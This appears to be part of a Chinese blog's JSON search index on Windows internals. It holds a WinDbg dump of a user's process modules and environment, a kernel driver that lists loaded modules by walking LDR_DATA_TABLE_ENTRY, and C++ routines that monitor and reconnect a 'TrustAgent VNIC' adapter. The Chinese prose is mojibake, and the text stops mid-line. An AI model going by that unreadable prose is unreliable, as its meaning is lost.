C:\\Windows\\System32\\oleacc.dll 7ffb18640000 f0c41b7e Jan 01 11:05:34 2098 C:\\Windows\\SYSTEM32\\textinputframework.dll 7ffb1db70000 ce358de3 Aug 19 04:30:27 2079 C:\\Windows\\System32\\CoreUIComponents.dll 7ffb1ded0000 d76cf31a Jul 12 19:59:22 2084 C:\\Windows\\System32\\CoreMessaging.dll 7ffb22780000 aff3315b Jul 18 10:18:03 2063 C:\\Windows\\System32\\WS2_32.dll 7ffb215c0000 3d60ad04 Aug 19 16:32:04 2002 C:\\Windows\\SYSTEM32\\ntmarta.dll 7ffb22ec0000 2f888521 Apr 10 09:08:49 1995 C:\\Windows\\System32\\ole32.dll 7ffb226a0000 20677495 Mar 25 14:09:25 1987 C:\\Windows\\System32\\comdlg32.dll 7ffb1d320000 332d6f47 Mar 18 00:20:23 1997 C:\\Windows\\system32\\PROPSYS.dll 7ffaf0910000 55510662 May 12 03:43:30 2015 C:\\Windows\\System32\\DUI70.dll 7ffaf0870000 3edb1f69 Jun 02 17:56:57 2003 C:\\Windows\\System32\\DUser.dll 7ffb1e7d0000 7ecc0a11 May 30 20:58:57 2037 C:\\Windows\\System32\\dwmapi.dll 7ffb05360000 b95c5d4e Jul 18 19:55:58 2068 C:\\Windows\\system32\\explorerframe.dll 7ffb1b110000 1fcf100d Nov 29 23:55:57 1986 C:\\Windows\\system32\\WindowsCodecs.dll 7ffb22280000 9723b943 May 09 17:20:03 2050 C:\\Windows\\System32\\bcrypt.dll 7ffb219a0000 62b75706 Jun 26 02:42:14 2022 C:\\Windows\\system32\\profapi.dll 7ffb052f0000 3aad9df3 Mar 13 12:11:31 2001 C:\\Windows\\System32\\thumbcache.dll 7ffb1be70000 223f725e Mar 17 14:29:50 1988 C:\\Windows\\SYSTEM32\\policymanager.dll 7ffb202e0000 f390ead1 Jun 29 04:13:05 2099 C:\\Windows\\system32\\msvcp110_win.dll 7ffb055b0000 49f7aa8e Apr 29 09:17:02 2009 C:\\Windows\\system32\\dataexchange.dll 7ffb1c650000 e193dcb4 Dec 05 03:44:52 2089 C:\\Windows\\system32\\d3d11.dll 7ffb1d580000 05174257 Sep 15 21:06:31 1972 C:\\Windows\\system32\\dcomp.dll 7ffb1f390000 e3f3eb09 Mar 11 09:04:09 2091 C:\\Windows\\system32\\dxgi.dll 7ffaf0820000 ca7e2859 Aug 27 12:51:37 2077 C:\\Windows\\System32\\Windows.UI.FileExplorer.dll 7ffb052c0000 be357357 Feb 15 05:12:55 2071 C:\\Windows\\system32\\edputil.dll 7ffb21eb0000 1ede815d May 31 12:43:09 1986 C:\\Windows\\System32\\CFGMGR32.dll 7ffb13cd0000 f30ed2fb Mar 22 11:56:43 2099 C:\\Windows\\System32\\Windows.FileExplorer.Common.dll 7ffb17050000 724543b6 Oct 02 11:25:42 2030 C:\\Windows\\System32\\iertutil.dll 7ffb1e3c0000 c42be918 Apr 18 01:34:16 2074 C:\\Windows\\SYSTEM32\\atlthunk.dll 7ffb16670000 da4754f3 Jan 17 20:11:31 2086 C:\\Windows\\System32\\StructuredQuery.dll 7ffb0d2f0000 c8e913db Oct 24 06:36:11 2076 C:\\Windows\\System32\\Windows.StateRepositoryPS.dll 7ffb01680000 61e9c87f Jan 21 04:39:27 2022 C:\\Windows\\system32\\Windows.Storage.Search.dll 7ffb1e3d0000 3ffe0471 Jan 09 09:31:29 2004 C:\\Windows\\system32\\LINKINFO.dll 7ffb21950000 441329cb Mar 12 03:49:31 2006 C:\\Windows\\system32\\SspiCli.dll 7ffae9d40000 e3a65137 Jan 11 12:23:19 2091 C:\\Program Files\\Common Files\\microsoft shared\\ink\\tiptsf.dll 7ffb23840000 a2ae2189 Jun 27 16:40:41 2056 C:\\Windows\\System32\\coml2.dll 7ffb07d90000 3f50139a Aug 30 11:01:46 2003 C:\\Windows\\System32\\twinapi.dll 7ffb1e3e0000 9d68abf2 Sep 08 02:31:14 2053 C:\\Windows\\system32\\apphelp.dll 7ffb22a50000 7680a595 Jan 01 05:48:05 2033 C:\\Windows\\System32\\SETUPAPI.dll 7ffb21890000 14531102 Oct 21 22:56:02 1980 C:\\Windows\\SYSTEM32\\VERSION.dll 7ffb055f0000 6a605d4a Jul 22 14:03:54 2026 C:\\Windows\\system32\\cldapi.dll 7ffb21600000 2ea9f33d Oct 23 13:23:09 1994 C:\\Windows\\system32\\FLTLIB.DLL 7ffb13620000 cfe5ad8c Jul 11 23:04:44 2080 C:\\Users\\holdy\\AppData\\Local\\Microsoft\\OneDrive\\23.189.0910.0001\\FileSyncShell64.dll 7ffb22020000 884d1633 Jun 19 09:15:31 2042 C:\\Windows\\System32\\CRYPT32.dll 7ffb0c940000 42b0d806 Jun 16 09:38:14 2005 C:\\Windows\\SYSTEM32\\WININET.dll 7ffb1fe00000 7aec0e44 May 09 10:28:20 2035 C:\\Windows\\SYSTEM32\\Secur32.dll 7ffb1d7a0000 5e1a2a61 Jan 12 04:04:49 2020 C:\\Windows\\SYSTEM32\\WTSAPI32.dll 7ffb21920000 ccba460f Nov 04 11:54:55 2078 C:\\Windows\\SYSTEM32\\USERENV.dll 7ffb20d30000 28e89a43 Oct 01 23:54:43 1991 C:\\Windows\\system32\\CRYPTBASE.DLL 7ffb18e60000 75e918f4 Sep 08 06:55:48 2032 C:\\Windows\\System32\\EhStorShell.dll 7ffb13b40000 a373b917 Nov 24 13:43:51 2056 C:\\Windows\\SYSTEM32\\ntshrui.dll 7ffb140f0000 8c31e680 Jul 14 11:41:52 2044 C:\\Windows\\System32\\cscui.dll 7ffb16cd0000 5430eec3 Oct 05 15:09:55 2014 C:\\Windows\\system32\\srvcli.dll 7ffb0bc50000 31063a34 Jan 24 21:55:00 1996 C:\\Windows\\system32\\cscapi.dll 7ffb18ea0000 b8ca2d77 Mar 29 22:40:55 2068 C:\\Windows\\system32\\WINMM.dll 7ffb1d7c0000 13731e9b May 05 02:06:19 1980 C:\\Windows\\system32\\mssprxy.dll 7ffb16d00000 7499a51d Dec 28 20:12:13 2031 C:\\Windows\\System32\\urlmon.dll 7ffb20d90000 fcf57d1b Jun 27 02:06:19 2104 C:\\Windows\\System32\\netutils.dll 7ffb1e380000 499386c1 Feb 12 10:17:37 2009 C:\\Windows\\system32\\NetworkExplorer.dll SubSystemData: 00007ffb1b5cf1d0 ProcessHeap: 000001acec0f0000 ProcessParameters: 000001acec0f1c90 CurrentDirectory: &#x27;C:\\Users\\holdy\\&#x27; WindowTitle: &#x27;C:\\Windows\\system32\\notepad.exe&#x27; ImageFile: &#x27;C:\\Windows\\system32\\notepad.exe&#x27; CommandLine: &#x27;&quot;C:\\Windows\\system32\\notepad.exe&quot; &#x27; DllPath: &#x27;&lt; Name not readable &gt;&#x27; Environment: 000001acec0f0fe0 =::=::\\ ALLUSERSPROFILE=C:\\ProgramData APPDATA=C:\\Users\\holdy\\AppData\\Roaming CLASSPATH=C:\\Program Files\\Java\\jdk-17\\lib CommonProgramFiles=C:\\Program Files\\Common Files CommonProgramFiles(x86)=C:\\Program Files (x86)\\Common Files CommonProgramW6432=C:\\Program Files\\Common Files COMPUTERNAME=DESKTOP-SM6JRAO ComSpec=C:\\Windows\\system32\\cmd.exe DriverData=C:\\Windows\\System32\\Drivers\\DriverData HOMEDRIVE=C: HOMEPATH=\\Users\\holdy JAVA_HOME=C:\\Program Files\\Java\\jdk-17 LOCALAPPDATA=C:\\Users\\holdy\\AppData\\Local LOGONSERVER=\\\\DESKTOP-SM6JRAO NUMBER_OF_PROCESSORS=2 OneDrive=C:\\Users\\holdy\\OneDrive OneDriveConsumer=C:\\Users\\holdy\\OneDrive OS=Windows_NT Path=%JAVA_HOME%\\bin;C:\\Program Files\\Java\\jdk-17\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\holdy\\AppData\\Local\\Microsoft\\WindowsApps; PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC PROCESSOR_ARCHITECTURE=AMD64 PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 140 Stepping 1, GenuineIntel PROCESSOR_LEVEL=6 PROCESSOR_REVISION=8c01 ProgramData=C:\\ProgramData ProgramFiles=C:\\Program Files ProgramFiles(x86)=C:\\Program Files (x86) ProgramW6432=C:\\Program Files PSModulePath=C:\\Program Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules PUBLIC=C:\\Users\\Public SESSIONNAME=Console SystemDrive=C: SystemRoot=C:\\Windows TEMP=C:\\Users\\holdy\\AppData\\Local\\Temp TMP=C:\\Users\\holdy\\AppData\\Local\\Temp USERDOMAIN=DESKTOP-SM6JRAO USERDOMAIN_ROAMINGPROFILE=DESKTOP-SM6JRAO USERNAME=holdy USERPROFILE=C:\\Users\\holdy windir=C:\\Windows æŸ¥çœ‹LDR 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960610: kd&gt; dt _LDR_DATA_TABLE_ENTRY 00007ffb244fc4c0ntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000001`00000058 - 0x00000000`00000000 ] +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x000001ac`ec0f2660 - 0x000001ac`f1b23d90 ] +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x000001ac`ec0f2670 - 0x000001ac`f1b23da0 ] +0x030 DllBase : 0x000001ac`ec0f24f0 Void +0x038 EntryPoint : 0x000001ac`f1b23db0 Void +0x040 SizeOfImage : 0 +0x048 FullDllName : _UNICODE_STRING &quot;&quot; +0x058 BaseDllName : _UNICODE_STRING &quot;&quot; +0x068 FlagGroup : [4] &quot;&quot; +0x068 Flags : 0 +0x068 PackagedBinary : 0y0 +0x068 MarkedForRemoval : 0y0 +0x068 ImageDll : 0y0 +0x068 LoadNotificationsSent : 0y0 +0x068 TelemetryEntryProcessed : 0y0 +0x068 ProcessStaticImport : 0y0 +0x068 InLegacyLists : 0y0 +0x068 InIndexes : 0y0 +0x068 ShimDll : 0y0 +0x068 InExceptionTable : 0y0 +0x068 ReservedFlags1 : 0y00 +0x068 LoadInProgress : 0y0 +0x068 LoadConfigProcessed : 0y0 +0x068 EntryProcessed : 0y0 +0x068 ProtectDelayLoad : 0y0 +0x068 ReservedFlags3 : 0y00 +0x068 DontCallForThreads : 0y0 +0x068 ProcessAttachCalled : 0y0 +0x068 ProcessAttachFailed : 0y0 +0x068 CorDeferredValidate : 0y0 +0x068 CorImage : 0y0 +0x068 DontRelocate : 0y0 +0x068 CorILOnly : 0y0 +0x068 ChpeImage : 0y0 +0x068 ReservedFlags5 : 0y00 +0x068 Redirected : 0y0 +0x068 ReservedFlags6 : 0y00 +0x068 CompatDatabaseProcessed : 0y0 +0x06c ObsoleteLoadCount : 0 +0x06e TlsIndex : 0 +0x070 HashLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x080 TimeDateStamp : 0x16510000 +0x088 EntryPointActivationContext : 0x00000000`00020000 _ACTIVATION_CONTEXT +0x090 Lock : 0x61db9c30`00000000 Void +0x098 DdagNode : 0x00770073`0002815d _LDR_DDAG_NODE +0x0a0 NodeModuleLink : _LIST_ENTRY [ 0x00690072`00650076 - 0x00340036`00790066 ] +0x0b0 LoadContext : 0x006c006c`0064002e _LDRP_LOAD_CONTEXT +0x0b8 ParentDllBase : (null) +0x0c0 SwitchBackContext : (null) +0x0c8 BaseAddressIndexNode : _RTL_BALANCED_NODE +0x0e0 MappingInfoIndexNode : _RTL_BALANCED_NODE +0x0f8 OriginalBase : 0x61db9c30`00000001 +0x100 LoadTime : _LARGE_INTEGER 0x00770073`0002815d +0x108 BaseNameHashValue : 0x650076 +0x10c LoadReason : 0x690072 (No matching name) +0x110 ImplicitPathOptions : 0x790066 +0x114 ReferenceCount : 0x340036 +0x118 DependentLoadFlags : 0x64002e +0x11c SigningLevel : 0x6c &#x27;l&#x27; 0x02ã€é€šè¿‡é©±åŠ¨ç¨‹åºè¯»å– LDR ä¸Šè¿°æˆ‘ä»¬å·²ç»çŸ¥é“äº† _LDR_DATA_TABLE_ENTRY çš„ç»“æ„ä½“ï¼Œä¸‹ä¸€æ­¥å°±å¯ä»¥æ ¹æ®å…¶ç»“æ„ä½“åœ¨é©±åŠ¨ç¨‹åºä¸­è¯»å–å†…æ ¸æ¨¡å—äº†ã€‚ 1234567891011typedef struct _LDR_DATA_TABLE_ENTRY&#123; LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; UINT64 SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName;&#125;LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY; åœ¨é©±åŠ¨è¿›ç¨‹ä¸­ï¼ŒNTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, UNICODE_STRING RegistryPath) çš„ DriverObject ä¿å­˜äº†å½“å‰é©±åŠ¨çš„ LDR_DATA_TABLE_ENTRY åœ°å€ã€‚ åŸºäºè¿™ä¸€ç‚¹ï¼Œå®Œæ•´çš„ç¨‹åºä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;wdm.h&gt;typedef struct _LDR_DATA_TABLE_ENTRY&#123; LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; UINT64 SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName;&#125;LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;VOID DriverUnload(PDRIVER_OBJECT DriverObject)&#123; DbgPrint(&quot;DriverUnload&quot;);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, UNICODE_STRING RegistryPath)&#123; NTSTATUS status = STATUS_SUCCESS; DbgPrint(&quot;DriverEntry&quot;); DriverObject-&gt;DriverUnload = DriverUnload; PLDR_DATA_TABLE_ENTRY pDection = DriverObject-&gt;DriverSection; //è·å–å½“å‰é©±åŠ¨çš„LDR_DATA_TABLE_ENTRYåœ°å€ PLDR_DATA_TABLE_ENTRY pCurrentDection = pDection; //è®°å½•å½“å‰é©±åŠ¨LDR_DATA_TABLE_ENTRYåœ°å€ do &#123; pDection = pDection-&gt;InLoadOrderLinks.Flink; //å…ˆæŸ¥è¯¢ä¸‹ä¸€ä¸ª DbgPrint(&quot;%ws&quot;, pDection-&gt;BaseDllName.Buffer); //è¾“å‡ºæ¨¡å—å &#125; while (pCurrentDection != pDection); //éå†åˆ°å½“å‰é©±åŠ¨LDR_DATA_TABLE_ENTRYåœ°å€æ—¶ï¼Œè¯´æ˜æŸ¥è¯¢ç»“æŸ return status;&#125; ç¨‹åºè¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"driver","slug":"driver","permalink":"https://hodlyounger.github.io/tags/driver/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"EasyDriver","slug":"A-OS/Windows/é©±åŠ¨/EasyDriver","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/EasyDriver/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘ã€Windowsã€‘è·å–ç½‘å¡æ•°é‡","date":"2023-10-27T01:24:02.078Z","path":"A_OS/Windows/ç½‘ç»œhelper/ã€ç½‘ç»œç¼–ç¨‹ã€‘è·å–ç½‘å¡æ•°é‡/","text":"æ¦‚è¿°ï¼šè·å–è™šæ‹Ÿç½‘å¡çš„ä¸ªæ•°ã€ç½‘å¡ä¿æ´»ã€åˆ¤æ–­ç½‘å¡æ˜¯å¦å­˜åœ¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455int GetNetCardNums()&#123; int nRet = 0; CoInitialize(NULL); INetConnectionManager* pNetManager; INetConnection* pNetConnection; IEnumNetConnection* pEnum; ULONG celtFetched; std::string strComGuid; NETCON_PROPERTIES* properties = nullptr; bool bIsInstalledNcCard = false; TapReg setRegGuid = get_tap_reg(); NcStatusList ncStausList; if (setRegGuid.size() == 0) &#123; SP_LOGW(&quot;%s Reg Not Found, Re Install&quot;, __SP_FUNC__); return 0; &#125; if (S_OK != CoCreateInstance(CLSID_ConnectionManager, NULL, CLSCTX_SERVER, IID_INetConnectionManager, (void**)&amp;pNetManager)) &#123; SP_LOGW(&quot;%s Com Instance Failed, sleep(5s)&quot;, __SP_FUNC__); return 0; &#125; pNetManager-&gt;EnumConnections(NCME_DEFAULT, &amp;pEnum); pNetManager-&gt;Release(); if (NULL == pEnum) &#123; return 0; &#125; while (pEnum-&gt;Next(1, &amp;pNetConnection, &amp;celtFetched) == S_OK) &#123; pNetConnection-&gt;GetProperties(&amp;properties); strComGuid = GUIDToString(properties-&gt;guidId); // æŸ¥çœ‹å½“å‰ç½‘å¡ä¸æ³¨å†Œè¡¨çš„guidä¸€è‡´æ—¶çš„çŠ¶æ€ for (auto&amp; it : setRegGuid) &#123; // #1 åˆ¤æ–­æ˜¯å¦å®‰è£…äº† è™šæ‹Ÿç½‘å¡ if (strComGuid.compare(it) == 0) &#123; nRet++; &#125; &#125; &#125; pEnum-&gt;Release(); return nRet;&#125; ç½‘å¡ä¿æ´» å£°æ˜ 1234567/** @fn keepAlive* @brief ç½‘ç»œè¿æ¥ä¿æ´»** @detail çº¿ç¨‹ï¼Œé€šè¿‡COMç»„ä»¶å®ç°*/void keepDeviceTAVnicAlive(); å®ç° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159void keepDeviceTAVnicAlive()&#123; std::lock_guard&lt;std::mutex&gt; lock(g_mutex); bool bRet = false; static int iRePtunFlag = 1; // Ncé‡è¿æ ‡å¿— static int iReLoadFlag = 1; // Dllé‡è½½æ ‡å¿— // ipc ä¸»è¦å¤„ç†ncå‘é€çš„æ¶ˆæ¯ TrustSpaceIPCUtil m_ncIpc(&quot;trustNcToCore&quot;); m_ncIpc.Initialize(&amp;HandleIpcCallBack); do &#123; CoInitialize(NULL); INetConnectionManager* pNetManager = nullptr; INetConnection* pNetConnection = nullptr; IEnumNetConnection* pEnum = nullptr; ULONG celtFetched; std::string strComGuid; bool bIsInstalledNcCard = false; TapReg setRegGuid = get_tap_reg(); NcStatusList ncStausList; if (setRegGuid.size() == 0) &#123; SP_LOGW(&quot;%s Reg Not Found, Re Install&quot;, __SP_FUNC__); goto __REINSTALL; &#125; if (S_OK != CoCreateInstance(CLSID_ConnectionManager, NULL, CLSCTX_SERVER, IID_INetConnectionManager, (void**)&amp;pNetManager)) &#123; SP_LOGW(&quot;%s Com Instance Failed, sleep(5s)&quot;, __SP_FUNC__); std::this_thread::sleep_for(std::chrono::milliseconds(1000 * 5)); continue; &#125; pNetManager-&gt;EnumConnections(NCME_DEFAULT, &amp;pEnum); if (pNetManager) &#123; pNetManager-&gt;Release(); pNetManager = nullptr; &#125; if (NULL == pEnum) &#123; return; &#125; while (pEnum-&gt;Next(1, &amp;pNetConnection, &amp;celtFetched) == S_OK) &#123; NETCON_PROPERTIES* properties = nullptr; pNetConnection-&gt;GetProperties(&amp;properties); if (properties != nullptr) &#123; strComGuid = GUIDToString(properties-&gt;guidId); // T1 æŸ¥çœ‹å½“å‰ç½‘å¡ä¸æ³¨å†Œè¡¨çš„guidä¸€è‡´æ—¶çš„çŠ¶æ€ for (auto&amp; it : setRegGuid) &#123; // #1 åˆ¤æ–­æ˜¯å¦å®‰è£…äº† è™šæ‹Ÿç½‘å¡ int minSize = min(strComGuid.size(), it.size()); if (it.compare(0, minSize, strComGuid, 0, minSize) == 0) &#123; ncStausList[properties-&gt;Status] = properties-&gt;pszwDeviceName; // #2 å·²å®‰è£… bIsInstalledNcCard = true; // #3 åˆ¤æ–­æ˜¯å¦è¢«ç¦ç”¨ if (NCS_DISCONNECTED == properties-&gt;Status) &#123; pNetConnection-&gt;Connect(); SP_LOGI(&quot;%s [NcCard] ReConnect&quot;, __SP_FUNC__); &#125; &#125; &#125; &#125; if (pNetConnection) &#123; pNetConnection-&gt;Release(); pNetConnection = nullptr; &#125; &#125; if (pEnum) &#123; pEnum-&gt;Release(); pEnum = nullptr; &#125; // T2 ç½‘å¡å¯ç”¨æ—¶ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰ä¸šåŠ¡éœ€è¦å¼€å¯ if (g_sp_trust_model &amp;&amp; g_sp_trust_model-&gt;Session()-&gt;NeedsL3Tunnel() &amp;&amp; // æœ‰ä¸‰å±‚ä¸šåŠ¡ !g_sp_trust_model-&gt;Session()-&gt;IsTunnelSvrsEmpty() &amp;&amp; // æœåŠ¡ä¸ä¸ºç©º g_sp_trust_model-&gt;Session()-&gt;IsOnline() &amp;&amp; // ä¼šè¯åœ¨çº¿ g_bNetWorkOnline) // å¿…é¡»è”ç½‘ &#123; iRePtunFlag = (iRePtunFlag &gt; 300) ? 0 : ++iRePtunFlag; if (ncStausList.find(NCS_CONNECTED) == ncStausList.end() &amp;&amp; (iRePtunFlag % 30 == 0)) &#123; SP_LOGI(&quot;%s [NcCard] Auto Detect ReConnect PTUN&quot;, __SP_FUNC__); if (iReLoadFlag == 5) &#123; SP_LOGI(&quot;%s [NcCard] Auto Detect ReConnect PTUN FAILED. RUN TIMES OVER 5, NECT:[NO OPTION]&quot;, __SP_FUNC__); &#125; handleReStartNc(); Sleep(5 * 1000); iReLoadFlag++; &#125; else if (ncStausList.find(NCS_CONNECTED) != ncStausList.end()) &#123; iReLoadFlag = 0; &#125; &#125; __REINSTALL: CoUninitialize(); if (false == bIsInstalledNcCard) // æœªå®‰è£…ï¼Œé‡æ–°å®‰è£… &#123; // #1 æœªå®‰è£…ï¼Œé‡æ–°å®‰è£… if (false == bIsInstalledNcCard) &#123; SP_DEV_LOGW(&quot;[NetCard] Detect Nc Card Not Installed&quot;); // #2 é‡æ–°å®‰è£… bIsInstalledNcCard = true; std::thread installCardThread([] &#123; g_sp_trust_model-&gt;NotifyUpMessage(SP_TRUST_TOPIC_MSG_NC_INSTALL, SPJSONObject(), 100); &#125;); installCardThread.detach(); // #3 ç­‰å¾…å®¢æˆ·ç«¯å®‰è£… Sleep(15 * 1000); &#125; &#125; else &#123; Sleep(1 * 1000); // æ¯ä¸€ç§’æ£€æŸ¥ä¸€æ¬¡ &#125; &#125; while (true); return;&#125; ç½‘å¡æ˜¯å¦å­˜åœ¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485bool IsExistNcCard()&#123; bool bIsExist = false; int nNetCardSize = 20; std::shared_ptr&lt;IP_ADAPTER_INFO&gt; pIpAdapterInfo(new IP_ADAPTER_INFO[nNetCardSize]); unsigned long stSize = sizeof(IP_ADAPTER_INFO) * nNetCardSize; //è·å–æ‰€æœ‰ç½‘å¡ä¿¡æ¯ï¼Œå‚æ•°äºŒä¸ºè¾“å…¥è¾“å‡ºå‚æ•° int nRel = GetAdaptersInfo(pIpAdapterInfo.get(), &amp;stSize); // ç©ºé—´ä¸è¶³ if (ERROR_BUFFER_OVERFLOW == nRel) &#123; pIpAdapterInfo.reset(new IP_ADAPTER_INFO[stSize]); if (GetAdaptersInfo(pIpAdapterInfo.get(), &amp;stSize) != NO_ERROR) &#123; std::cout &lt;&lt; &quot;Failed to get adapter info&quot; &lt;&lt; std::endl; return false; &#125; &#125; PIP_ADAPTER_INFO cur = pIpAdapterInfo.get(); // å¤šä¸ªç½‘å¡ é€šè¿‡é“¾è¡¨å½¢å¼é“¾æ¥èµ·æ¥çš„ std::string netdesc; std::string netip; while (cur) &#123; netdesc = cur-&gt;Description; switch (cur-&gt;Type) &#123; case MIB_IF_TYPE_OTHER: break; case MIB_IF_TYPE_ETHERNET: &#123; IP_ADDR_STRING* pIpAddrString = &amp;(cur-&gt;IpAddressList); netip = pIpAddrString-&gt;IpAddress.String; &#125; break; case MIB_IF_TYPE_TOKENRING: break; case MIB_IF_TYPE_FDDI: break; case MIB_IF_TYPE_PPP: break; case MIB_IF_TYPE_LOOPBACK: break; case MIB_IF_TYPE_SLIP: break; default://æ— çº¿ç½‘å¡,Unknown type &#123; IP_ADDR_STRING* pIpAddrString = &amp;(cur-&gt;IpAddressList); netip = pIpAddrString-&gt;IpAddress.String; &#125; break; &#125; char hex[16] = &#123; &#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27; &#125;; // mac åœ°å€ä¸€èˆ¬6ä¸ªå­—èŠ‚ // mac äºŒè¿›åˆ¶è½¬16è¿›åˆ¶å­—ç¬¦ä¸² char macStr[18] = &#123; 0 &#125;;//12+5+1 int k = 0; for (UINT j = 0; j &lt; cur-&gt;AddressLength; j++) &#123; macStr[k++] = hex[(cur-&gt;Address[j] &amp; 0xf0) &gt;&gt; 4]; macStr[k++] = hex[cur-&gt;Address[j] &amp; 0x0f]; macStr[k++] = &#x27;-&#x27;; &#125; if (k &lt; 18 &amp;&amp; k &gt; 0) &#123; macStr[k - 1] = 0; &#125; cur = cur-&gt;Next; // æ‰¾åˆ° &quot;TrustAgent VNIC&quot; if (netdesc.find(&quot;TrustAgent VNIC&quot;) != std::string::npos) &#123; bIsExist = true; goto _END_; &#125; &#125;_END_: return bIsExist;&#125;","tags":[{"name":"windows/ç½‘å¡","slug":"windows-ç½‘å¡","permalink":"https://hodlyounger.github.io/tags/windows-%E7%BD%91%E5%8D%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘ã€Windowsã€‘ç½‘ç»œè¿æ¥äº‹ä»¶","date":"2023-10-27T01:24:02.077Z","path":"A_OS/Windows/ç½‘ç»œhelper/ã€ç½‘ç»œç¼–ç¨‹ã€‘ç½‘ç»œè¿æ¥äº‹ä»¶/","text":"æ¦‚è¿°ï¼šNotifyNetworkConnectivityHintChange å‡½æ•°ç”¨ä¾‹","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"Windows/API","slug":"Windows-API","permalink":"https://hodlyounger.github.io/tags/Windows-API/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘ã€Windowsã€‘ç›‘æ§è·¯ç”±äº‹ä»¶","date":"2023-10-27T01:24:02.076Z","path":"A_OS/Windows/ç½‘ç»œhelper/ã€ç½‘ç»œç¼–ç¨‹ã€‘ç›‘æ§è·¯ç”±äº‹ä»¶/","text":"ç›¸å…³æ–‡ç« ï¼š ä½¿ç”¨winsock2 è¯´æ˜ ç›‘æ§ç½‘å¡å¯ä»¥ä½¿ç”¨ NotifyRouteChange å’Œ NotifyRouteChange2 å‡½æ•°ï¼Œé€šè¿‡æ³¨å†Œå›è°ƒå®ç°è·¯ç”±ç›‘æ§ ä¸»è¦æ­¥éª¤ å£°æ˜ä¸€ä¸ªå›è°ƒå‡½æ•°å¤„ç†é€šçŸ¥ è°ƒç”¨notifyRouteChange2æ³¨å†Œé€šçŸ¥,æŒ‡å®šé€šçŸ¥ç±»å‹ ç­‰å¾…é€šçŸ¥ å–æ¶ˆé€šçŸ¥(å¯é€‰) åœ¨å›è°ƒå‡½æ•°ä¸­æ ¹æ®é€šçŸ¥ç±»å‹è¿›è¡Œå¤„ç† ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#ifndef WIN32_LEAN_AND_MEAN#define WIN32_LEAN_AND_MEAN#endif#define _WINSOCK_DEPRECATED_NO_WARNINGS#include &lt;iostream&gt;#include&lt;iomanip&gt;#include&lt;string&gt;#include &lt;windows.h&gt;#include &lt;winsock2.h&gt;#include &lt;ws2tcpip.h&gt;#include 